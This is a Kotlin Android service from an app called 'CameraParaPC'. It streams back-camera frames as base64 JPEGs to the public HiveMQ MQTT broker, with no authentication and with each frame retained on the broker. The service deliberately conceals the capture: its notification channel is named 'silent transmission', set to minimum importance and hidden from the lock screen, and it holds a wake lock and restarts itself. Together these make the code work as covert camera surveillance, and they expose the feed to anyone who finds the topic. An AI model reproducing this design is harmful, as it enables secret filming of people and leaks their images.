package com.venice.cameraparapc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.graphics.Rect
import android.graphics.YuvImage
import android.os.Build
import android.os.PowerManager
import android.util.Base64
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import org.eclipse.paho.client.mqttv3.MqttClient
import org.eclipse.paho.client.mqttv3.MqttConnectOptions
import org.eclipse.paho.client.mqttv3.MqttMessage
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class CameraService : LifecycleService() {

    companion object {
        private const val CANAL = "camstream_silencioso"
        private const val NOTIF_ID = 42
        private const val BROKER = "tcp://broker.hivemq.com:1883"
        private const val PREFIXO = "camstream"
        private const val LARGURA_MAX = 640
        private const val INTERVALO_MS = 130L
        private const val BATIDA_MS = 10000L

        fun idDispositivo(ctx: Context): String {
            val p = ctx.getSharedPreferences("camstream", Context.MODE_PRIVATE)
            var id = p.getString("id", null)
            if (id == null) {
                val alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
                id = (1..6).map { alfabeto[Random.nextInt(alfabeto.length)] }.joinToString("")
                p.edit().putString("id", id).apply()
            }
            return id
        }

        fun nomeDispositivo(): String {
            val m = Build.MODEL
            return if (m.isNullOrBlank()) "Celular" else m
        }
    }

    private lateinit var id: String
    private lateinit var nome: String
    private lateinit var topicoInfo: String
    private lateinit var topicoFrame: String

    private val executor = Executors.newSingleThreadExecutor()
    private val ocupado = AtomicBoolean(false)

    @Volatile private var mqtt: MqttClient? = null
    @Volatile private var rodando = true
    private var ultimoEnvio = 0L
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        id = idDispositivo(this)
        nome = nomeDispositivo()
        topicoInfo = "$PREFIXO/$id/info"
        topicoFrame = "$PREFIXO/$id/frame"

        criarCanal()
        startForeground(NOTIF_ID, montarNotificacao())
        segurarCpu()
        iniciarCamera()
        conectarMqtt()
        Thread { batidaLoop() }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    private fun criarCanal() {
        val ch = NotificationChannel(
            CANAL, "Transmissao silenciosa", NotificationManager.IMPORTANCE_MIN)
        ch.setShowBadge(false)
        ch.enableVibration(false)
        ch.setSound(null, null)
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun montarNotificacao(): Notification =
        NotificationCompat.Builder(this, CANAL)
            .setContentTitle("CameraParaPC")
            .setContentText("Transmitindo")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(false)
            .setSilent(true)
            .setShowWhen(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    private fun segurarCpu() {
        val pm = getSystemService(PowerManager::class.java)
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "camstream::camera").apply {
            setReferenceCounted(false)
            acquire()
        }
    }

    private fun iniciarCamera() {
        val futuro = ProcessCameraProvider.getInstance(this)
        futuro.addListener({
            try {
                val provider = futuro.get()
                val analise = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .setTargetResolution(Size(640, 480))
                    .build()
                analise.setAnalyzer(executor) { proxy -> enviarFrame(proxy) }
                provider.unbindAll()
                provider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, analise)
            } catch (e: Exception) {
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun conectarMqtt() {
        Thread {
            try {
                val cid = "cam_" + id + "_" + System.currentTimeMillis()
                val c = MqttClient(BROKER, cid, MemoryPersistence())
                val lwt = JSONObject()
                    .put("n", nome).put("t", 0L).put("off", true).toString()
                val opt = MqttConnectOptions().apply {
                    isCleanSession = true
                    isAutomaticReconnect = true
                    connectionTimeout = 10
                    keepAliveInterval = 30
                    setWill(topicoInfo, lwt.toByteArray(), 1, true)
                }
                c.connect(opt)
                mqtt = c
                publicarInfo(false)
            } catch (e: Exception) {
            }
        }.start()
    }

    private fun batidaLoop() {
        while (rodando) {
            try { publicarInfo(false) } catch (_: Exception) {}
            try { Thread.sleep(BATIDA_MS) } catch (_: InterruptedException) {}
        }
    }

    private fun publicarInfo(offline: Boolean) {
        val c = mqtt ?: return
        if (!c.isConnected) return
        val json = JSONObject()
            .put("n", nome)
            .put("t", System.currentTimeMillis())
            .put("off", offline)
            .toString()
        val m = MqttMessage(json.toByteArray())
        m.qos = 1
        m.isRetained = true
        c.publish(topicoInfo, m)
    }

    private fun enviarFrame(image: ImageProxy) {
        val agora = System.currentTimeMillis()
        if (agora - ultimoEnvio < INTERVALO_MS || ocupado.get()) {
            image.close()
            return
        }
        ocupado.set(true)
        ultimoEnvio = agora
        try {
            var bmp = converter(image) ?: return
            val rot = image.imageInfo.rotationDegrees
            if (rot != 0) {
                val m = Matrix().apply { postRotate(rot.toFloat()) }
                bmp = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, m, true)
            }
            if (bmp.width > LARGURA_MAX) {
                val h = bmp.height * LARGURA_MAX / bmp.width
                bmp = Bitmap.createScaledBitmap(bmp, LARGURA_MAX, h, true)
            }
            val out = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 55, out)
            publicarFrame(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP))
        } catch (e: Exception) {
        } finally {
            image.close()
            ocupado.set(false)
        }
    }

    private fun converter(image: ImageProxy): Bitmap? {
        val y = image.planes[0].buffer
        val u = image.planes[1].buffer
        val v = image.planes[2].buffer
        val ySize = y.remaining(); val uSize = u.remaining(); val vSize = v.remaining()
        val nv21 = ByteArray(ySize + uSize + vSize)
        y.get(nv21, 0, ySize)
        v.get(nv21, ySize, vSize)
        u.get(nv21, ySize + vSize, uSize)
        val yuv = YuvImage(nv21, ImageFormat.NV21, image.width, image.height, null)
        val out = ByteArrayOutputStream()
        yuv.compressToJpeg(Rect(0, 0, image.width, image.height), 70, out)
        val bytes = out.toByteArray()
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }

    private fun publicarFrame(base64: String) {
        val c = mqtt ?: return
        if (!c.isConnected) return
        val msg = MqttMessage(base64.toByteArray())
        msg.qos = 0
        msg.isRetained = true
        c.publish(topicoFrame, msg)
    }

    override fun onDestroy() {
        rodando = false
        try { publicarInfo(true) } catch (_: Exception) {}
        try { mqtt?.disconnect() } catch (_: Exception) {}
        try { mqtt?.close() } catch (_: Exception) {}
        try { wakeLock?.release() } catch (_: Exception) {}
        executor.shutdown()
        super.onDestroy()
    }
}
